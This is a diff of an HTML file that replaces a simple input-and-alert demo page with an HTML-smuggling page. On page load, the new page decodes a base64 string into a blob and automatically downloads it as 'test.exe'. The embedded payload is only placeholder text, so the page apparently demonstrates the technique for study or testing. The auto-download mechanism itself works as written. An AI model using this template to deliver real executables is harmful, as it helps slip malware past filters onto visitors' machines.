@@ -1,40 +1,44 @@
-<!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Simple Web App</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 50px;
-    }
-    input, button {
-      padding: 10px;
-      margin: 5px;
-    }
-  </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
 </head>
 <body>
+    <p>Downloading your file...</p>
 
-  <h2>Simple Web Application</h2>
+    <script>
+        function convertFromBase64(base64) {
+            let binary_string = window.atob(base64);
+            let len = binary_string.length;
+            let bytes = new Uint8Array(len);
+            for (let i = 0; i < len; i++) {
+                bytes[i] = binary_string.charCodeAt(i);
+            }
+            return bytes.buffer;
+        }
 
-  <input type="text" id="myInput" placeholder="Type something..." />
-  <button onclick="showAlert()">Show Alert</button>
+        function downloadFile() {
+            const file = 'VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU='; // "This is a smuggled file"
+            const fileName = 'test.exe';
+            let data = convertFromBase64(file);
+            let blob = new Blob([data], { type: 'application/octet-stream' });
 
-  <p><a href="https://example.com" target="_blank">Visit Example.com</a></p>
+            if (window.navigator.msSaveOrOpenBlob) {
+                window.navigator.msSaveBlob(blob, fileName);
+            } else {
+                const a = document.createElement('a');
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                const url = window.URL.createObjectURL(blob);
+                a.href = url;
+                a.download = fileName;
+                a.click();
+                window.URL.revokeObjectURL(url);
+                document.body.removeChild(a);
+            }
+        }
 
-  <script>
-    function showAlert() {
-      const inputValue = document.getElementById('myInput').value;
-      alert("You typed: " + inputValue);
-    }
-
-<script>
-  if (top !== self) {
-    top.location = "https://securelayer7.net";
-  }
-</script>
-  </script>
-
+        // Automatically trigger download when the page loads
+        window.onload = downloadFile;
+    </script>
 </body>
 </html>
